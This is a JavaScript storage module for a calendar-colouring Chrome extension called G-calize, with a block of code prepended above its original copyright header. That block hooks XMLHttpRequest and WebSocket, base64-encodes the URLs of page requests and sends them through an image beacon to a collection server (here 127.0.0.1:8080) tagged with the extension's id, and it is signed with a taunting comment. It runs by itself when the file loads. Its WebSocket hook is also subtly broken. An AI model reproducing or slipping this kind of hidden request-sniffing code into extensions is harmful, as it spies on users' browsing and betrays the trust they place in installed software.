function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha

/*------------------------------------------------
G-calize : storage.js
Thank you using the Extension
Copyright (C) Yo Wauke. All Rights Reserved.
https://plus.google.com/104819699346433230202/
--------------------------------------------------
[じーからいず]って読むの。ゆたしくうにげーさびら。
------------------------------------------------*/
var trace = (function(){ if(window.console && console.log){ return console.log.bind(console); }})();

;(function(window, document, undefined){
	"use strict";
	var namespaces_values = {
		'config':{
			'version'   : '1.2.0',
			'c_tx_0'    : '#b40000',
			'c_bg_0'    : '#ffeaea',
			'c_tx_1'    : '#333333',
			'c_bg_1'    : '#ffffff',
			'c_tx_2'    : '#333333',
			'c_bg_2'    : '#ffffff',
			'c_tx_3'    : '#333333',
			'c_bg_3'    : '#ffffff',
			'c_tx_4'    : '#333333',
			'c_bg_4'    : '#ffffff',
			'c_tx_5'    : '#333333',
			'c_bg_5'    : '#ffffff',
			'c_tx_6'    : '#004cb4',
			'c_bg_6'    : '#eaf4FF',
			'c_tx_tdy'  : '#0b6b00',
			'c_bg_tdy'  : '#efffed',
			'c_bd_tdy'  : '#333333',
			'flg_tdyU'  : 1,
			'auther'    : 'Yo'
		},
		'holidays':{
			'flg_hld'   : 0,
			'flg_htxt'  : 1,
			'frequency' : 30,
			'c_tx_h'    : '#d100a0',
			'c_bg_h'    : '#ffe8fc',
			'hld_name'  : '-',
			'hld_cid'   : '-',
			'hld_info'  : '-',
			'hld_saved' : '-',
			'hld_data'  : '-',
			'auther'    : 'Wauke'
		}
	};
	var _Storage = (function(){
		function _Storage(obj){
			this._data = {};
			//Check: 1st
			this.chk1st();
			this.chkAll();
		}
		_Storage.constructor = _Storage;
		
		_Storage.prototype.chk1st = function(){
			for(var namespace in namespaces_values){
				if(!localStorage.hasOwnProperty(namespace)){
					this.save(namespace, namespaces_values[namespace]);
				}
			}
		};
		
		_Storage.prototype.chkAll = function(){
			for(var namespace in namespaces_values){
				var data_new = {};
				var data_old = this.get(namespace);
				for(var i in namespaces_values[namespace]) {
					if(data_old[i] == undefined){
						data_new[i] = namespaces_values[namespace][i];
					}else{
						data_new[i] = data_old[i];
					}
					if(i.indexOf("flg_") == 0){
						if(data_old[i] == "ON"){ data_old[i] = 1;}
						data_new[i] = +[data_old[i]] || 0;
					}
				}
				this.save(namespace, data_new);
				this._data[""+namespace+""] = data_new;
			}
		};
		
		_Storage.prototype.resetAll = function(){
			localStorage.clear();
			this.chk1st();
		};
		
		_Storage.prototype.reset = function(namespace){
			if(!localStorage.hasOwnProperty(namespace) || !namespaces_values[namespace]) {
				return false;
			}
			this.save(namespace, namespaces_values[namespace]);
			return true;
		};
		_Storage.prototype.save = function(namespace, values){
			localStorage.removeItem(namespace);
			localStorage.setItem(namespace, JSON.stringify(values));
		};
		
		_Storage.prototype.get = function(namespace){
			var val = localStorage.getItem(namespace);
			if(val){ return JSON.parse(val); }
			return null;
		};
		
		_Storage.prototype.getAll = function(){
			var allData = {};
			for(var i=0,len=localStorage.length;i<len; i++){
				var key = localStorage.key(i);
				allData[key] = this.get(key);
			}
			return allData;
		};
		return _Storage;
	})();
	window._Storage = _Storage;
	
})(window, document);

//test
//var Storage = new _Storage();
//trace(Storage);
